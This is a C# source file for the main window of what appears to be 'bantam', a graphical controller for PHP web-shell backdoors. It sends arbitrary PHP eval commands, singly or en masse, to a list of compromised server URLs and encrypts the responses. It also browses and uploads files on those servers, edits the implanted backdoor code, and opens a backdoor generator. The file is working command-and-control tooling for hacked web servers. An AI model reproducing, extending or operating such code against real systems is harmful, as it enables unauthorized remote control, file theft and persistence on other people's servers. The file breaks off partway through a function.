﻿using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

using bantam.Classes;
using bantam.Forms;

namespace bantam
{
    public partial class BantamMain : Form
    {
        /// <summary>
        /// Full path and name of xml file if a file has opened (used for saving)
        /// </summary>
        private static string g_OpenFileName;

        /// <summary>
        /// Full url of the Shell we have selected in the main listview
        /// </summary>
        private static string g_SelectedShellUrl;

        /// <summary>
        /// 
        /// </summary>
        public static ConcurrentDictionary<String, ShellInfo> Shells = new ConcurrentDictionary<String, ShellInfo>();

        /// <summary>
        ///
        ///
        /// </summary>
        public BantamMain()
        {
            InitializeComponent();

            //has to be initialized with parameters manually because, constructor with params breaks design mode...
            txtBoxFileBrowserPath.Initialize(btnFileBrowserBack_MouseClick, 21);
        }

        #region HELPER_FUNCTIONS

        //public void AddShellLog(string )

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public bool validTarget(string shellUrl = "")
        {
            if (string.IsNullOrEmpty(shellUrl)) {
                shellUrl = g_SelectedShellUrl;
            }

            if (string.IsNullOrEmpty(shellUrl) == false
             && Shells.ContainsKey(shellUrl)
             && Shells[shellUrl].down == false) {
                return true;
            }
            return false;
        }

        /// <summary>
        /// TODO clean this up and make a success / fail function
        /// </summary>
        /// <param name="shellUrl"></param>
        /// <param name="pingMS"></param>
        public void AddShellToListView(string shellUrl, string pingMS)
        {
            ListViewItem lvi = new ListViewItem(new string[] { shellUrl, pingMS + " ms" }) {
                Font = new System.Drawing.Font("Microsoft Tai Le", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)))
            };
            listViewShells.Items.Add(lvi);

            if (pingMS == "-") {
                int lastIndex = listViewShells.Items.Count - 1;
                listViewShells.Items[lastIndex].BackColor = System.Drawing.Color.Red;

                Shells[shellUrl].down = true;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="shellURL"></param>
        public void guiCallbackRemoveShellURL(string shellURL)
        {
            ListViewItem selectedLvi = listViewShells.FindItemWithText(shellURL);
            if (selectedLvi != null) {
                listViewShells.FindItemWithText(shellURL).Remove();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="url"></param>
        /// <param name="phpCode"></param>
        /// <param name="title"></param>
        /// <param name="encryptResponse"></param>
        /// <param name="responseEncryptionMode"></param>
        /// <param name="richTextBox"></param>
        /// <param name="prependText"></param>
        public static async Task executePHPCodeDisplayInRichTextBox(string url, string phpCode, string title, bool encryptResponse, int responseEncryptionMode, RichTextBox richTextBox = null, string prependText = "")
        {
            //todo this doesn't have a timeout
            ResponseObject response = await Task.Run(() => WebHelper.ExecuteRemotePHP(url, phpCode));

            if (string.IsNullOrEmpty(response.Result) == false) {
                string result = response.Result;
                if (encryptResponse) {
                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                }

                if (string.IsNullOrEmpty(result)) {
                    //todo level 2 logging
                    return;
                }

                result = result.Replace(PhpHelper.rowSeperator, "\r\n");

                if (!string.IsNullOrEmpty(prependText)) {
                    result = prependText + result + "\r\n";
                }

                if (richTextBox != null && richTextBox.IsDisposed == false) {
                    richTextBox.Text += result;
                } else {
                    GuiHelper.RichTextBoxDialog(title, result);
                }
            } else {
                //todo level 3 logging
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="shellUrl"></param>
        public async Task InitializeShellData(string shellUrl)
        {
            if (string.IsNullOrEmpty(shellUrl) == false) {
                string[] data;     
                bool encryptResponse = Shells[shellUrl].responseEncryption;
                int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

                Stopwatch pingWatch = new Stopwatch();
                pingWatch.Start();

                if (!Helper.IsValidUri(shellUrl)) {
                    AddShellToListView(shellUrl, "-");
                    return;
                }

                var task = WebHelper.ExecuteRemotePHP(shellUrl, PhpHelper.InitShellData(encryptResponse));

                //todo add to global config delay
                if (await Task.WhenAny(task, Task.Delay(10000)) == task) {
                    ResponseObject response = task.Result;

                    if (string.IsNullOrEmpty(response.Result) == false) {
                        string result = response.Result;
                        if (encryptResponse) {
                            result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                        }

                        data = result.Split(new string[] { PhpHelper.g_delimiter }, StringSplitOptions.None);
                        
                        var initDataReturnedVarCount = Enum.GetValues(typeof(ShellInfo.INIT_DATA_VARS)).Cast<ShellInfo.INIT_DATA_VARS>().Max();

                        if (data != null && data.Length == (int)initDataReturnedVarCount + 1) {
                            AddShellToListView(shellUrl, pingWatch.ElapsedMilliseconds.ToString());

                            Shells[shellUrl].Update(pingWatch.ElapsedMilliseconds, data);
                            Shells[shellUrl].down = false;

                        } else {
                            AddShellToListView(shellUrl, "-");
                        }
                    } else {
                        AddShellToListView(shellUrl, "-");
                    }
                    pingWatch.Stop();
                } else {
                    AddShellToListView(shellUrl, "-");
                }
            }
        }

        #endregion

        #region GUI_EVENTS

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void userAgentSwitcherToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string userAgent = "User Agent: " + WebHelper.g_GlobalDefaultUserAgent;
            string newUserAgent = GuiHelper.UserAgentSwitcher(userAgent, "Change User Agent");

            if (!string.IsNullOrEmpty(newUserAgent)) {
                WebHelper.g_GlobalDefaultUserAgent = newUserAgent;
            } else {
                //todo logging
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void evalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string code;
            bool checkBoxChecked = true;
            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            if (encryptResponse) {
                string preCode = "@ob_start();";
                string postCode = "$result = @ob_get_contents(); @ob_end_clean();";
                code = preCode + GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - " + shellUrl, string.Empty, ref checkBoxChecked) + postCode;
            } else {
                code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - " + shellUrl, string.Empty, ref checkBoxChecked);
            }

            if (string.IsNullOrEmpty(code) == false) {
                if (checkBoxChecked) {
                    executePHPCodeDisplayInRichTextBox(shellUrl, code, "PHP Eval Result - " + shellUrl, encryptResponse, responseEncryptionMode);
                } else {
                    await WebHelper.ExecuteRemotePHP(shellUrl, code);
                }
            } else {
                //todo logging
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="shellUrl"></param>
        /// <param name="code"></param>
        /// <param name="encryptResponse"></param>
        /// <param name="responseEncryptionMode"></param>
        /// <param name="rtb"></param>
        private async Task executeMassEval(string shellUrl, string code, bool encryptResponse, int responseEncryptionMode, bool showResponse, RichTextBox rtb)
        {
            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, code);

            if (string.IsNullOrEmpty(response.Result) == false) {
                string result = response.Result;
                if (encryptResponse) {
                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                }

                if (!showResponse) {
                    return;
                }

                if (!string.IsNullOrEmpty(result)) {
                    if (rtb != null && rtb.IsDisposed == false) {
                        rtb.Text += "Result from (" + shellUrl + ") \r\n" + result + "\r\n\r\n";
                    }
                }
            }
        }

        /// <summary>
        /// Mass Eval!  
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void evalToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            bool showResponse = false;

            string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - Mass Eval", string.Empty, ref showResponse);

            if (string.IsNullOrEmpty(code)) {
                return;
            }

            RichTextBox rtb = GuiHelper.RichTextBoxDialog("Mass Eval", string.Empty);

            foreach (ListViewItem lvClients in listViewShells.Items) {
                string shellUrl = lvClients.Text;
                if (Shells.ContainsKey(shellUrl)) {
                    bool encryptResponse = Shells[shellUrl].responseEncryption;
                    int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

                    string finalCode = code;
                    if (encryptResponse) {
                        string preCode = "@ob_start();";
                        string postCode = "$result = @ob_get_contents(); @ob_end_clean();";
                        finalCode = preCode + code + postCode;
                    }
                    executeMassEval(shellUrl, finalCode, encryptResponse, responseEncryptionMode, showResponse, rtb);
                }
            }
        }

        /// <summary>
        /// Edits the PHP code of BANTAM that is stored online ! @dangerous
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void editPHPCodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            //windows does not currently support uploading
            if (Shells[shellUrl].IsWindows) {
                return;
            }

            string phpCode = PhpHelper.ReadFileFromVar(PhpHelper.phpServerScriptFileName, encryptResponse);
            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);

            if (string.IsNullOrEmpty(response.Result)) {
                //todo level 3 logging
                return;
            }

            string result = response.Result;

            if (encryptResponse) {
                result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
            }

            UploadFile u = new UploadFile(shellUrl, result, true);
            u.ShowDialog();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void pingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewShells);

            if (lvi != null
            && (Shells[shellUrl].pingStopwatch == null || Shells[shellUrl].pingStopwatch.IsRunning == false)) {

                Shells[shellUrl].pingStopwatch = new Stopwatch();
                Shells[shellUrl].pingStopwatch.Start();

                //todo test this when shell has gone away
                string phpCode = PhpHelper.PhpTestExecutionWithEcho1(encryptResponse);
                ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);

                if (string.IsNullOrEmpty(response.Result)) {
                    //todo level 3 logging
                    return;
                }

                string result = response.Result;

                if (encryptResponse) {
                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                }

                if (string.IsNullOrEmpty(result)) {
                    MessageBox.Show("Error Decoding Response!", "Whoops!!!");
                    return;
                }

                lvi.SubItems[1].Text = Shells[shellUrl].pingStopwatch.ElapsedMilliseconds.ToString() + " ms";
                Shells[shellUrl].pingStopwatch.Stop();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void phpinfoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, PhpHelper.PhpInfo(encryptResponse));

            if (string.IsNullOrEmpty(response.Result) == false) {
                string result = response.Result;

                if (encryptResponse) {
                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                }

                if (string.IsNullOrEmpty(result)) {
                    MessageBox.Show("Error Decoding Response!", "Whoops!!!!!");
                    return;
                }

                BrowserView broView = new BrowserView(result, 1000, 1000);
                broView.Show();
            } else {
                //todo level 3 logging
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listviewClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewShells);

            if (lvi != null) {
                if (!string.IsNullOrEmpty(g_SelectedShellUrl) && Shells.ContainsKey(g_SelectedShellUrl)) {

                    //copy a backup of the current file tree view into clients
                    if (treeViewFileBrowser.Nodes != null && treeViewFileBrowser.Nodes.Count > 0) {

                        //Clear previously cached treeview to only store 1 copy
                        if (Shells[g_SelectedShellUrl].files != null
                         && Shells[g_SelectedShellUrl].files.Nodes != null
                         && Shells[g_SelectedShellUrl].files.Nodes.Count > 0) {
                            Shells[g_SelectedShellUrl].files.Nodes.Clear();
                        }

                        //store current treeview into client and clear
                        GuiHelper.CopyNodesFromTreeView(treeViewFileBrowser, Shells[g_SelectedShellUrl].files);
                        treeViewFileBrowser.Nodes.Clear();
                    }
                }
                
                if (!string.IsNullOrEmpty(g_SelectedShellUrl)
                 && Shells.ContainsKey(g_SelectedShellUrl)
                 && !string.IsNullOrEmpty(Shells[g_SelectedShellUrl].Pwd)
                 && !string.IsNullOrEmpty(txtBoxFileBrowserPath.Text)) {
                    Shells[g_SelectedShellUrl].Pwd = txtBoxFileBrowserPath.Text;
                }

                if (!string.IsNullOrEmpty(richTextBoxConsoleOutput.Text)) {
                    Shells[g_SelectedShellUrl].consoleText = richTextBoxConsoleOutput.Text;
                }

                g_SelectedShellUrl = lvi.SubItems[0].Text;

                if (!string.IsNullOrEmpty(Shells[g_SelectedShellUrl].consoleText)) {
                    richTextBoxConsoleOutput.Text = Shells[g_SelectedShellUrl].consoleText;
                } else {
                    richTextBoxConsoleOutput.Text = string.Empty;
                }

                if (Shells[g_SelectedShellUrl].IsWindows) {
                    btnUpload.Enabled = false;
                    btnFileBrowserGo.Enabled = false;
                    txtBoxFileBrowserPath.Enabled = false;
                } else {
                    btnUpload.Enabled = true;
                    btnFileBrowserGo.Enabled = true;
                    txtBoxFileBrowserPath.Enabled = true;
                }

                foreach (ListViewItem lvClients in listViewShells.Items) {
                    //todo store color and revert to original color, for now skip if red
                    if (lvClients.BackColor != System.Drawing.Color.Red) {
                        lvClients.BackColor = System.Drawing.SystemColors.Window;
                        lvClients.ForeColor = System.Drawing.SystemColors.WindowText;
                    }
                }

                if (lvi.BackColor != System.Drawing.Color.Red) {
                    lvi.BackColor = System.Drawing.SystemColors.Highlight;
                    lvi.ForeColor = System.Drawing.SystemColors.HighlightText;
                }

                if (validTarget() == false) {
                    textBoxCWD.Text = string.Empty;
                    textBoxFreeSpace.Text = string.Empty;
                    textBoxHDDSpace.Text = string.Empty;
                    textBoxServerIP.Text = string.Empty;
                    textBoxUname.Text = string.Empty;
                    textBoxUser.Text = string.Empty;
                    textBoxWebServer.Text = string.Empty;
                    textBoxGroup.Text = string.Empty;
                    textBoxPHP.Text = string.Empty;
                    txtBoxFileBrowserPath.Text = string.Empty;
                    return;
                } else {
                    textBoxCWD.Text = Shells[g_SelectedShellUrl].Cwd;
                    textBoxFreeSpace.Text = string.IsNullOrEmpty(Shells[g_SelectedShellUrl].FreeHDDSpace) ? "0"
                                         : Helper.FormatBytes(Convert.ToDouble(Shells[g_SelectedShellUrl].FreeHDDSpace));

                    textBoxHDDSpace.Text = string.IsNullOrEmpty(Shells[g_SelectedShellUrl].TotalHDDSpace) ? "0"
                                        : Helper.FormatBytes(Convert.ToDouble(Shells[g_SelectedShellUrl].TotalHDDSpace));

                    textBoxServerIP.Text = Shells[g_SelectedShellUrl].Ip;
                    textBoxUname.Text = Shells[g_SelectedShellUrl].UnameRelease + " " + Shells[g_SelectedShellUrl].UnameKernel;
                    textBoxUser.Text = Shells[g_SelectedShellUrl].Uid + " ( " + Shells[g_SelectedShellUrl].User + " )";
                    textBoxWebServer.Text = Shells[g_SelectedShellUrl].ServerSoftware;
                    textBoxGroup.Text = Shells[g_SelectedShellUrl].Gid + " ( " + Shells[g_SelectedShellUrl].Group + " )";
                    textBoxPHP.Text = Shells[g_SelectedShellUrl].PHP_VERSION;
                }

                if (tabControlMain.SelectedTab == tabPageFiles) {
                    if (Shells[g_SelectedShellUrl].files.Nodes != null
                     && Shells[g_SelectedShellUrl].files.Nodes.Count > 0) {
                        GuiHelper.CopyNodesFromTreeView(Shells[g_SelectedShellUrl].files, treeViewFileBrowser);
                        treeViewFileBrowser.Refresh();
                        treeViewFileBrowser.ExpandAll();

                        txtBoxFileBrowserPath.Text = Shells[g_SelectedShellUrl].Pwd;
                    } else {
                        StartFileBrowser();
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            if (tabControlMain.SelectedTab == tabPageFiles) {
                //if the gui's treeview is empty and the cached treeview data is not empty
                if (treeViewFileBrowser.Nodes != null 
                && treeViewFileBrowser.Nodes.Count == 0
                && Shells[shellUrl].files.Nodes != null
                && Shells[shellUrl].files.Nodes.Count > 0) {

                    //populate the treeview from cache
                    GuiHelper.CopyNodesFromTreeView(Shells[shellUrl].files, treeViewFileBrowser);
                    treeViewFileBrowser.Refresh();
                    treeViewFileBrowser.ExpandAll();

                    txtBoxFileBrowserPath.Text = Shells[shellUrl].Pwd;
                } else {
                    //if the gui treeview is empty, start the filebrowser and display it
                    if (treeViewFileBrowser.Nodes.Count == 0) {
                        StartFileBrowser();
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void saveClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            XmlHelper.SaveShells(g_OpenFileName);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void pingClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //keep alive checks with this?
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ModifyShell addClientForm = new ModifyShell();
            addClientForm.Show();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listviewClientsContextMenu_Paint(object sender, PaintEventArgs e)
        {
            if (validTarget()) {
                phpToolStripMenuItem.Visible = true;
                systemToolstripMenuItem.Visible = true;
                softwareToolStripMenuItem.Visible = true;

                if (Shells[g_SelectedShellUrl].IsWindows) {
                    linuxToolStripMenuItem.Visible = false;
                    windowsToolStripMenuItem.Visible = true;
                } else {
                    linuxToolStripMenuItem.Visible = true;
                    windowsToolStripMenuItem.Visible = false;
                }
            } else {
                phpToolStripMenuItem.Visible = false;
                systemToolstripMenuItem.Visible = false;
                softwareToolStripMenuItem.Visible = false;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(g_SelectedShellUrl) == false) {
                listViewShells.SelectedItems[0].Remove();
                if (Shells.ContainsKey(g_SelectedShellUrl)) {

                    if (!Shells.TryRemove(g_SelectedShellUrl, out ShellInfo outShellInfo)) {
                        //todo global logging
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void testConnectionStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(g_SelectedShellUrl)
             || Shells.ContainsKey(g_SelectedShellUrl) == false) {
                return;
            }

            string shellURL = g_SelectedShellUrl;
            ShellInfo shellInfo = Shells[shellURL];

            listViewShells.FindItemWithText(shellURL).Remove();

            Shells.TryRemove(shellURL, out ShellInfo shellInfoRemove);
            Shells.TryAdd(shellURL, shellInfo);

            InitializeShellData(shellURL);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void backdoorGeneratorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            BackdoorGenerator backdoorGenerator = new BackdoorGenerator();
            backdoorGenerator.Show();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void saveShellsAsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveShellsXMLDialog = new SaveFileDialog {
                Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml",
                FilterIndex = 2,
                RestoreDirectory = true
            };

            if (saveShellsXMLDialog.ShowDialog() == DialogResult.OK) {
                XmlHelper.SaveShells(saveShellsXMLDialog.FileName);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void openShellXmlFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var openShellXMLDialog = new OpenFileDialog {
                Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml",
                FilterIndex = 2,
                RestoreDirectory = true
            }) {
                if (openShellXMLDialog.ShowDialog() == DialogResult.OK) {
                    foreach (ListViewItem lvClients in listViewShells.Items) {
                        if (Shells.ContainsKey(lvClients.Text)) {

                            Shells.TryRemove(lvClients.Text, out ShellInfo outShellInfo);
                        }
                        lvClients.Remove();
                    }
                    XmlHelper.LoadShells(openShellXMLDialog.FileName);

                    g_OpenFileName = openShellXMLDialog.FileName;
                    saveClientsToolStripMenuItem.Enabled = true;
                }
            }
        }
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void editToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(g_SelectedShellUrl) == false) {
                string shellUrl = g_SelectedShellUrl;
                string varName = Shells[shellUrl].requestArgName;
                string varType = (Shells[shellUrl].sendDataViaCookie ? "cookie" : "post");

                ModifyShell updateHostForm = new ModifyShell(shellUrl, varName, varType);
                updateHostForm.Show();
            }
        }

        /// <summary>
        /// Enter Keydown Hadler for console input
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void textBoxConsoleInput_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                btnConsoleGoClick_Click(sender, e);
                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        /// <summary>
        /// Enter Keydown handler for filebrowser path
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void txtBoxFileBrowserPath_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                btnFileBrowserGo_Click(sender, e);
                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        #endregion

        #region FILE_BROWSER_EVENTS

        /// <summary>
        /// 
        /// </summary>
        private async void btnFileBrowserBack_MouseClick(object sender, EventArgs e)
        {
            FilebrowserGoBack();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnUpload_Click(object sender, EventArgs e)
        {
            if (validTarget() == false) {
                return;
            }

            if (string.IsNullOrEmpty(txtBoxFileBrowserPath.Text)) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;

            //windows does not currently support uploading
            if (Shells[shellUrl].IsWindows) {
                return;
            }

            UploadFile u = new UploadFile(shellUrl, txtBoxFileBrowserPath.Text);
            u.ShowDialog();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnFileBrowserGo_Click(object sender, EventArgs e)
        {
            btnFileBrowserGo.Enabled = false;

            if (validTarget() == false) {
                return;
            }

            if (string.IsNullOrEmpty(txtBoxFileBrowserPath.Text)) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            string phpVersion = Shells[shellUrl].PHP_VERSION;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            //windows does not currently support direct path operations
            if (Shells[shellUrl].IsWindows) {
                return;
            }

            string directoryContentsPHPCode = PhpHelper.DirectoryEnumerationCode(txtBoxFileBrowserPath.Text, phpVersion, encryptResponse);
            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode);

            Shells[shellUrl].files.Nodes.Clear();

            //if user didn't switch targets by the time this callback is triggered clear the live treeview
            if (g_SelectedShellUrl == shellUrl) {
                treeViewFileBrowser.Nodes.Clear();
                treeViewFileBrowser.Refresh();
            }

            if (response.Result != null && response.Result.Length > 0) {
                string result = response.Result;
                if (encryptResponse) {
                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                }

                if(!string.IsNullOrEmpty(result)) {
                    FileBrowserRender(result, shellUrl);
                } else {
                    //todo level 3 logging
                }
            }
            btnFileBrowserGo.Enabled = true;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="result"></param>
        /// <param name="shellUrl"></param>
        private async Task FileBrowserRender(string result, string shellUrl)
        {
            string[] rows = result.Split(new string[] { PhpHelper.rowSeperator }, StringSplitOptions.None);

            if (rows.Length > 0 && rows != null) {
                foreach (string row in rows) {
                    string[] columns = row.Split(new string[] { PhpHelper.g_delimiter }, StringSplitOptions.None);

                    if (columns != null && columns.Length - 2 > 0) {

                        string permissionOctal = Convert.ToString(Convert.ToInt32(columns[4]), 8);
                        string perms = permissionOctal.Substring(permissionOctal.Length - 4);

                        if (columns[columns.Length - 2] == "dir") {
                            //if the user switched targets we do not update the live filebrowser because it is for a different target
                            if (g_SelectedShellUrl == shellUrl) {
                                TreeNode lastTn = treeViewFileBrowser.Nodes.Add(string.Empty, columns[0], 0);
                                lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                if (string.IsNullOrEmpty(columns[2]) == false) {
                                    lastTn.ToolTipText = perms + " - " + Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                } else {
                                    lastTn.ToolTipText = perms;
                                }
                            } else {
                                //the user changed "shellUrl/targets" before the call back so we add it into their client cache instead of the live treeview
                                TreeNode lastTn = Shells[shellUrl].files.Nodes.Add(string.Empty, columns[0], 0);
                                lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                if (string.IsNullOrEmpty(columns[2]) == false) {
                                    lastTn.ToolTipText = perms + " - " + Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                } else {
                                    lastTn.ToolTipText = perms;
                                }
                            }
                        } else {
                            //if the user switched targets we do not update the live filebrowser because it is for a different target
                            if (g_SelectedShellUrl == shellUrl) {
                                TreeNode lastTn = treeViewFileBrowser.Nodes.Add(string.Empty, columns[0], 6);
                                lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                if (string.IsNullOrEmpty(columns[2]) == false) {
                                    lastTn.ToolTipText = perms + " - " + Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                } else {
                                    lastTn.ToolTipText = perms;
                                }
                            } else {
                                //the user changed "shellUrl/targets" before the call back so we add it into their client cache instead of the live treeview
                                TreeNode lastTn = Shells[shellUrl].files.Nodes.Add(string.Empty, columns[0], 6);
                                lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                if (string.IsNullOrEmpty(columns[2]) == false) {
                                    lastTn.ToolTipText = perms + " - " + Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                } else {
                                    lastTn.ToolTipText = perms;
                                }
                            }
                        }
                    }
                }
                treeViewFileBrowser.Sort();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        private async Task StartFileBrowser()
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].responseEncryption;
            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;

            txtBoxFileBrowserPath.Text = Shells[shellUrl].Cwd;

            if (Shells[shellUrl].IsWindows) {
                txtBoxFileBrowserPath.Text = string.Empty;

                string phpCode = PhpHelper.GetHardDriveLettersPhp(encryptResponse);
                ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);

                if (string.IsNullOrEmpty(response.Result)) {
                    //todo level 3 logging
                    return;
                }

                string result = response.Result;

                if (encryptResponse) {
                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                }

                if (string.IsNullOrEmpty(result) == false) {
                    string[] drives;
                    drives = result.Split(new string[] { "|" }, StringSplitOptions.RemoveEmptyEntries);

                    if (drives != null && drives.Length > 0) {
                        treeViewFileBrowser.Nodes.Clear();
                        foreach (string drive in drives) {
                            treeViewFileBrowser.Nodes.Add(string.Empty, drive, 3);
                        }
                    }
                } else {
                    MessageBox.Show(response.Result, "Failed decoding response");
                }
            } else {
                string phpVersion = Shells[shellUrl].PHP_VERSION;

                string directoryContentsPHPCode = PhpHelper.DirectoryEnumerationCode(".", phpVersion, encryptResponse);
                ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode);

                if (!string.IsNullOrEmpty(response.Result)) {
                    string result = response.Result;
                    if (encryptResponse) {
                        result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
                    }
                    if (!string.IsNullOrEmpty(result)) {
                        FileBrowserRender(result, shellUrl);
                    } else {
                        //todo level 3 logging
                    }
                } else {
                    //todo level 3 logging
                }
            }

            if (tabControlMain.SelectedTab != tabPageFiles) {
                tabControlMain.SelectedTab = tabPageFiles;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        private async Task FilebrowserGoBack()
        {
            if (validTarget() == false) {
                return;
            }

            string shellUrl = g_SelectedShellUrl;
            ShellInfo shell = Shells[shellUrl];
            
            //windows does not currently support the back operation
            if (shell.IsWindows) {
                return;
            }

